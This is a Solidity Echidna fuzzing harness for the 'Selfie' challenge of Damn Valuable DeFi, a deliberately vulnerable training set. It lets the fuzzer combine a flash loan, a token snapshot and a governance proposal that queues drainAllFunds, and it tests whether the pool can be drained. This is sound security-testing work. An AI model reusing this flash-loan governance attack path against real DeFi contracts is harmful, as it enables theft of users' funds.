// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "../SelfiePool.sol";
import "../SimpleGovernance.sol";
import "../../DamnValuableTokenSnapshot.sol";

/**
 * @notice to run echidna use following command:
 * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaSelfieGeneric --config ./contracts/selfie/echidna/config.yaml
 */

// this contract is used to set fuzzing environment (to deploy all necessary contracts)
contract SelfieDeploymentGeneric {
    uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    function deployContracts()
        external
        returns (
            SelfiePool,
            SimpleGovernance,
            DamnValuableTokenSnapshot
        )
    {
        // deploy contracts
        DamnValuableTokenSnapshot token;
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

        SimpleGovernance governance;
        governance = new SimpleGovernance(address(token));

        SelfiePool pool;
        pool = new SelfiePool(address(token), address(governance));
        // fund selfie pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        return (pool, governance, token);
    }
}

contract EchidnaSelfieGeneric {
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    uint256 weiAmount;
    uint256 actionId;
    uint256 timestampActionQueued;
    uint256 transferAmount;

    uint256[] public funcArray;
    // needs to ordered by callFunc()
    string[4] private functions = [
        "queueAction",
        "executeAction",
        "drainAllFunds",
        "transferFrom"
    ];

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    event ActionCalled(string action);
    event AssertionFailed(string reason);

    constructor() payable {
        SelfieDeploymentGeneric deployer;
        deployer = new SelfieDeploymentGeneric();
        (pool, governance, token) = deployer.deployContracts();
    }

    function flashLoan() public {
        // borrow max amount of tokens
        uint256 borrowAmount = token.balanceOf(address(pool));
        pool.flashLoan(borrowAmount);
    }

    function receiveTokens(address, uint256 _amount) external {
        require(
            msg.sender == address(pool),
            "Only pool can call this function."
        );
        // logic
        callbackFunctions();
        // repay the loan
        require(token.transfer(address(pool), _amount), "flash loan failed");
    }

    function generateFuncArray(uint256[] calldata nums)
        external
        returns (uint256[] memory)
    {
        uint256 numsLength = nums.length;
        // reset array
        funcArray = new uint256[](numsLength);
        // populate array
        uint256 _numberOfCallbackFuctions = functions.length;
        for (uint256 i; i < numsLength - 1; i++) {
            // to have only numbers in a range of total amount of functions defined in a callback function
            uint256 num = nums[i] % _numberOfCallbackFuctions;
            funcArray[i] = num;
        }
        return funcArray;
    }

    function callFunc(uint256 _num) internal returns (bool) {
        require(0 <= _num && _num < functions.length, "Out of range");
        bool success = false;
        if (_num == 0) {
            try this.queueAction() {
                success = true;
            } catch {}
        }
        if (_num == 1) {
            try this.executeAction() {
                success = true;
            } catch {}
        }
        if (_num == 2) {
            uint256 balanceBefore = token.balanceOf(address(this));
            drainAllFunds();
            uint256 balanceAfter = token.balanceOf(address(this));
            success = balanceBefore < balanceAfter ? true : false;
        }
        if (_num == 4) {
            uint256 balanceBefore = token.balanceOf(address(this));
            transferFrom();
            uint256 balanceAfter = token.balanceOf(address(this));
            success = balanceBefore < balanceAfter ? true : false;
        }
        return success;
    }

    function callbackFunctions() internal {
        uint256 genArrLength = funcArray.length;
        bool success = false;
        if (genArrLength != 0) {
            for (uint256 i; i < genArrLength - 1; i++) {
                success = callFunc(funcArray[i]);
                if (!success) {
                    revert("Callback function failed");
                }
            }
        }
    }

    function queueAction() public {
        // create payload
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        // takeSnaphost as it is needed in queueAction()
        token.snapshot();
        // queue action
        actionId = governance.queueAction(address(pool), payload, 0);
        // set testing variables
        timestampActionQueued = block.timestamp;
    }

    function executeAction() public {
        // it does not make sense to call executeAction if the requirment is not met
        require(
            block.timestamp >= timestampActionQueued + ACTION_DELAY_IN_SECONDS,
            "Time for action execution has not passed yet"
        );
        governance.executeAction(actionId);
    }

    function drainAllFunds() public {
        pool.drainAllFunds(address(this));
    }

    function transferFrom() public {
        uint256 _poolBalance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), address(this), _poolBalance);
    }

    ////////////////
    // INVARIANTS //
    ////////////////

    // GENERAL: Can we drain SelfiePool?

    function _checkPoolBalance() external view returns (bool) {
        if (token.balanceOf(address(pool)) == TOKENS_IN_POOL) {
            return true;
        } else {
            revert("Invariant broken");
        }
    }

    function checkPoolBalance() external {
        try this._checkPoolBalance() {} catch {
            for (uint256 i; i < funcArray.length; i++) {
                emit ActionCalled(functions[funcArray[i]]);
            }
            emit AssertionFailed("Invariant broken");
        }
    }

    // function checkThisContractBalance() external view {
    //     assert(token.balanceOf(address(this)) == 0);
    // }
}
